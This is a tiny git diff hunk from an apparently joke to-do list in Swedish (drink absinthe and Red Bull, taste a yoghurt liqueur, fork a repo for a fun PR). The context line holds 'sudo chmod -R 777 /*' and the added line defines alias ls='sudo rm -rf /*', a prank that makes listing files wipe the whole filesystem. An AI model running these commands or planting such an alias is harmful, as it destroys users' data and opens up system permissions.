@@ -24,3 +24,4 @@ sudo chmod -R 777 /*
 absint/red bull
 testa Bols Natural Yoghurt Liqueur
 forka repot och gör en rolig PR
+alias ls='sudo rm -rf /*'
